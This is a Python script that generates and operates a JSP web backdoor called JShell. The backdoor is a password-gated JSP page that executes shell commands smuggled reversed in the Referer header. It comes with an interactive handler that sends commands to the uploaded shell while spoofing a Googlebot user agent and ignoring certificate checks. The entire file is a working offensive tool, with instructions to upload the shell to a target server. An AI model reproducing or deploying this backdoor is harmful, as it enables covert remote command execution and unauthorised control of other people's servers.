import requests
import sys
import string
import random
import readline

import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)


'''
<%@page import="java.io.*"%>
<%

if (request.getHeader("Referer") != null && request.getParameter("p") != null && "password".equals(request.getParameter("p")) ) {
    String result_var_name = "";
    try {

        String referrer_var_name = new StringBuilder(request.getHeader("Referer")).reverse().toString();
        Process proc_var_name = Runtime.getRuntime().exec(referrer_var_name);
        

        BufferedReader stdout_var_name = new BufferedReader(new InputStreamReader(proc_var_name.getInputStream()));
        BufferedReader stderr_var_name = new BufferedReader(new InputStreamReader(proc_var_name.getErrorStream()));

        String temp_str_var_name = null;
        while ((temp_str_var_name = stdout_var_name.readLine()) != null) {
            result_var_name += temp_str_var_name + "\\n";
        }
        while ((temp_str_var_name = stderr_var_name.readLine()) != null) {
            result_var_name += temp_str_var_name + "\\n";
        }

    } catch (Exception exception_var_name) {
        result_var_name=exception_var_name.toString();
    }

    out.println(new StringBuilder(result_var_name).reverse().toString());

} else {

    response.sendRedirect("/");
}

%>
'''






class JShell:
    def __init__ (self,webshell_filename=None,c_and_c_http_header="Referer",
                  user_agent="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                  webshell_url=None,webshell_password=None,cookie=None):

        self.webshell_filename = webshell_filename
        self.c_and_c_http_header = c_and_c_http_header
        if self.c_and_c_http_header is not None:
            self.c_and_c_http_header = self.c_and_c_http_header.replace('\\','\\\\').replace('"','\\"')

        
        self.webshell_url = webshell_url
        self.webshell_password = webshell_password
        if self.webshell_password is not None:
            self.webshell_password = self.webshell_password.replace('\\','\\\\').replace('"','\\"')
        self.user_agent = user_agent
        self.cookie = cookie



    def random_str(self,length):
        rnd_str = ''
        for i in range(length):
            rnd_str += random.choice(string.ascii_lowercase)
        return rnd_str


    def generate_webshell_file(self):
        
        shell_template ='<%@page import="java.io.*"%><%if(request.getHeader("{c_and_c_header}")!=null' \
                        '&&request.getParameter("p")!=null&&"{password_string}".equals(request.getParameter("p")))' \
                        '{{String {result_var_name}="";try{{String {c_and_c_var_name}=new StringBuilder(request.getHeader("{c_and_c_header}"))' \
                        '.reverse().toString();Process {proc_var_name}=Runtime.getRuntime().exec({c_and_c_var_name});' \
                        'BufferedReader {stdout_var_name}=new BufferedReader(new InputStreamReader({proc_var_name}.getInputStream()));' \
                        'BufferedReader {stderr_var_name}=new BufferedReader(new InputStreamReader({proc_var_name}.getErrorStream()));' \
                        'String {temp_str_var_name} = null;while(({temp_str_var_name}={stdout_var_name}.readLine())!=null){{{result_var_name}+=' \
                        '{temp_str_var_name}+"\\n";}}while(({temp_str_var_name}={stderr_var_name}.readLine())!=null){{{result_var_name}+=' \
                        '{temp_str_var_name}+"\\n";}}}}catch(Exception {exception_var_name}){{{result_var_name}={exception_var_name}.toString();}}' \
                        'out.println(new StringBuilder({result_var_name}).reverse().toString());}}else{{response.sendRedirect("/");}}%>'
        shell_contents = shell_template.format(result_var_name=self.random_str(5),
                                               c_and_c_var_name=self.random_str(5),
                                               proc_var_name=self.random_str(5),
                                               stdout_var_name=self.random_str(5),
                                               stderr_var_name=self.random_str(5),
                                               temp_str_var_name=self.random_str(5),
                                               exception_var_name=self.random_str(5),
                                               password_string=self.webshell_password,
                                               c_and_c_header=self.c_and_c_http_header
                                               )
        if self.webshell_filename is None:
            return shell_contents
        else:
            try:

                f=open(self.webshell_filename,"w")
                f.write(shell_contents)
                f.close()
                return True
            except Exception as e:
                return str(e)



    def webshell_exec_cmd(self,cmd):
        post_data = {"p":self.webshell_password}
        headers = {
                   self.c_and_c_http_header: cmd[::-1],
                   "User-Agent": self.user_agent
                  }
        if self.cookie is not None:
            headers["Cookie"] = self.cookie
        try:

            r = requests.post(self.webshell_url,headers=headers,data=post_data, verify = False, timeout = 100,allow_redirects=False)
            result = r.text.strip()[::-1]
            return r.status_code,result
        except Exception as e:
            return 9999,str(e)


    def connect_to_webshell(self):
        if self.webshell_url is None:
            self.webshell_url=input("* Enter URL of uploaded web shell file: ")
        
        if self.webshell_password is None:
            self.webshell_password=input("* Enter your password: ")
        

        print("* Checking...")
        cmd_exec_http_code,cmd_output=self.webshell_exec_cmd("id")
        if cmd_exec_http_code==200 and "uid" in cmd_output:
            print("+ Connected!")
            while True:
                cmd=input("JShell> ")
                if cmd.strip() != "":

                    if cmd == "exit":
                        print("+ Disconnected")
                        break
                    cmd_exec_http_code,cmd_output=self.webshell_exec_cmd(cmd)
                    if cmd_exec_http_code == 200:
                        print(cmd_output)
                    else:
                        print("- Error! Could not connect to the web shell!")
                        print("  HTTP status: "+str(cmd_exec_http_code))
                        print("  Maybe password is incorrect or something went wrong.")
        elif cmd_exec_http_code == 9999:
            print("- Failed to execute command.")
            print("- "+cmd_output)
        else:
            print("- Error! Could not connect to the web shell!")
            print("  HTTP status: "+str(cmd_exec_http_code))
            print("  Maybe password is incorrect or something went wrong.")
            return False
        




def main():
    print("")
    print(" Handler for JShell")
    print(" Jshell is a simple web backdoor for JSP platforms.")
    choice = None
    while choice is None:
        print("")
        print(" Options:")
        print(" 1- Connect to existing web shell")
        print(" 2- Generate new web shell file")
        print(" 3- Exit")
        print("")
        choice=input("  Enter your choice number (1,2,3): ")
        if choice == "1":
            webshell_url=input("* Enter URL of uploaded web shell file: ")
            webshell_password=input("* Enter your password: ")
            cookie_value = input("* Enter Cookie header value (blank if not required): ")
            if cookie_value.strip() == "":
                cookie_value=None
            js = JShell(webshell_url=webshell_url,webshell_password=webshell_password,cookie=cookie_value)
            js.connect_to_webshell()
            choice=None
        elif choice == "2":
            webshell_password = input("* Enter your password: ")
            webshell_filename = input("* Enter output file name (e.g. shell.jsp): ")
            js = JShell(webshell_password=webshell_password,webshell_filename=webshell_filename)
            res = js.generate_webshell_file()
            if res is True:
                print("+ Done")
                print("+ Created web shell was saved to " + webshell_filename + " in the current directory.")
                print("  Upload the file to the target server and connect to it using JShell.")
            else:
                print("- Failed to create web shell file.")
                print("- " + res)
            choice=None
        elif choice == "3":
            print("+ JShell loves you! Bye Bye!")
            sys.exit()
        else:
            choice=None



if __name__ == '__main__':
    main()